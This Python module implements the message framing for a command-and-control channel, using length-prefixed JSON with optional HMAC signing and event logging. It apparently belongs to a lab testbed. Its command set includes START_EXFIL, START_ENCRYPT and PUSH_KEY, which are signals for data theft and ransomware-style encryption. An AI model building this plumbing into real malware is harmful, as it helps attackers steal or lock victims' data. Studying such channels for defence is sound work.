"""Length-prefixed JSON frames with optional HMAC-SHA256 authentication."""

import hashlib
import hmac
import json
import os
import struct
from datetime import datetime, timezone
from pathlib import Path

from config import HMAC_SECRET, LOG_DIR

MAX_FRAME = 4096
COMMANDS = {"PING", "STOP", "START_EXFIL", "START_ENCRYPT", "PUSH_KEY"}
MESSAGES = COMMANDS | {"ACK", "REJECT"}


def _canonical(payload):
    return json.dumps(payload, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=True).encode("utf-8")


def _secret():
    if not isinstance(HMAC_SECRET, bytes) or len(HMAC_SECRET) < 16:
        raise ValueError("HMAC_SECRET must be at least 16 bytes")
    return HMAC_SECRET


def pack(message, *, signed=True, data=None):
    if message not in MESSAGES:
        raise ValueError("Unknown C2 message")
    body = {"cmd": message, "data": data or {}, "nonce": os.urandom(16).hex()}
    if signed:
        body["tag"] = hmac.new(_secret(), _canonical(body), hashlib.sha256).hexdigest()
    serialized = _canonical(body)
    if len(serialized) > MAX_FRAME:
        raise ValueError("C2 frame too large")
    return struct.pack("!I", len(serialized)) + serialized


def recv_exact(sock, count):
    result = bytearray()
    while len(result) < count:
        chunk = sock.recv(count - len(result))
        if not chunk:
            raise ConnectionError("Incomplete C2 frame")
        result.extend(chunk)
    return bytes(result)


def unpack(sock, *, auth_mode):
    size = struct.unpack("!I", recv_exact(sock, 4))[0]
    if not (1 <= size <= MAX_FRAME):
        raise ValueError("Invalid C2 frame size")
    body = json.loads(recv_exact(sock, size))
    if not isinstance(body, dict) or body.get("cmd") not in MESSAGES:
        raise ValueError("Invalid C2 message")
    if not isinstance(body.get("data"), dict) or not isinstance(body.get("nonce"), str):
        raise ValueError("Invalid C2 data or nonce")
    tag = body.pop("tag", None)
    if auth_mode:
        if not isinstance(tag, str):
            raise ValueError("Unsigned C2 message rejected")
        expected = hmac.new(_secret(), _canonical(body), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(tag, expected):
            raise ValueError("Invalid C2 HMAC")
    body["authenticated"] = bool(auth_mode)
    return body


def log_event(event, *, role, **fields):
    directory = Path(LOG_DIR)
    directory.mkdir(parents=True, exist_ok=True)
    record = {"ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
              "module": "c2", "event": event, "role": role, **fields}
    with (directory / "c2.log").open("a", encoding="utf-8") as stream:
        stream.write(json.dumps(record, sort_keys=True) + "\n")
